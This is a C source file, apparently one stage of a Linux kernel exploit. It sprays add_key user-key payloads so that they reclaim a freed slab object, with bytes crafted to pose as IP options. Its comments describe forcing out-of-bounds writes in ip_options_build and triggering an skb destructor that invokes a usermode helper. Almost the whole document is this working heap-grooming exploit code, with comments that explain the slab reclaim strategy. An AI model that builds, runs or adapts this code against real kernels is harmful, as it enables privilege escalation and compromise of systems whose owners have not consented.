/* keyhold.c - HOLD reclaim spray via add_key user_key_payload.
 *
 * add_key("user", desc, payload, plen, KEY_SPEC_PROCESS_KEYRING) allocates a
 * user_key_payload { rcu_head(16) + datalen(2) + pad(6) + data[] } and HOLDS
 * it (until revoked). Payload bytes land at object+24:
 *   object+24 = data[0]  = optlen
 *   object+25 = data[1]  = srr
 *   object+26 = data[2]  = rr
 *   object+27 = data[3]  = ts
 *   object+28 = data[4]  = flags
 *   object+32 = data[8]  = __data
 *   object+39 = data[15] = s1 marker   object+47 = data[23] = s3 marker
 * faddr (object+16) is NOT controllable (datalen + uninit pad) but that is
 * SURVIVABLE: the ip_options_build OOB writes of X (shinfo+8) and Y (shinfo+12)
 * use daddr/route-src, not faddr; a garbage faddr just fails the route and the
 * built skb is freed in task context -> skb->destructor (the umh) fires anyway.
 *
 * HOLD matters (AGENTS.md 8e): on a stock boot the freed victim lands on the
 * freeing CPU's per-cpu partial list; only an allocation that EXHAUSTS the
 * active slab pulls it. add_key holds -> drains the slab -> wins the reclaim.
 *
 * Build: gcc -O2 -static -o keyhold keyhold.c
 * Usage: sudo ./keyhold <runtime_s> [cpu]
 */
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#define KEY_SPEC_PROCESS_KEYRING -2

static long add_key(const char *type, const char *desc, const void *payload,
                    size_t plen, int keyring) {
    return syscall(SYS_add_key, type, desc, payload, plen, keyring);
}

#define PLEN 72

int main(int argc, char **argv) {
    int runtime = argc > 1 ? atoi(argv[1]) : 30;
    int cpu = argc > 2 ? atoi(argv[2]) : 0;
    cpu_set_t s;
    CPU_ZERO(&s); CPU_SET(cpu, &s);
    sched_setaffinity(0, sizeof(s), &s);

    unsigned char buf[PLEN];
    int safe = getenv("ACCEPTOR_SAFE") != NULL;
    memset(buf, 0x41, sizeof(buf));
    buf[0] = 40;    /* data[0]  -> optlen */
    buf[1] = safe ? 0 : 67;    /* data[1]  -> srr    */
    buf[2] = safe ? 0 : 68;    /* data[2]  -> rr     */
    buf[3] = safe ? 0 : 69;    /* data[3]  -> ts     */
    buf[4] = safe ? 0x00 : 0x28;  /* data[4] -> flags: rr_needaddr | ts_needaddr */
    /* data[8..] -> __data: TS option */
    buf[8]  = 0x44;
    buf[9]  = 0x28;
    buf[10] = 0x25;
    buf[11] = 0x20;
    /* markers: s1 = object[39..42] = data[15..18], s3 = object[47..50] = data[23..26] */
    buf[15] = 0x41; buf[16] = 0x42; buf[17] = 0x43; buf[18] = 0x44;  /* 0x44434241 */
    buf[23] = 0x45; buf[24] = 0x46; buf[25] = 0x47; buf[26] = 0x48;  /* 0x48474645 */

    unsigned long n = 0;
    time_t t0 = time(NULL);
    char desc[16];
    while ((int)(time(NULL) - t0) < runtime) {
        for (int i = 0; i < 256; i++) {
            /* unique desc so each key is a NEW held object (no replace-churn) */
            snprintf(desc, sizeof(desc), "k%lu", n);
            if (add_key("user", desc, buf, sizeof(buf),
                        KEY_SPEC_PROCESS_KEYRING) >= 0)
                n++;
        }
    }
    fprintf(stderr, "[keyhold] keys=%lu\n", n);
    return 0;
}
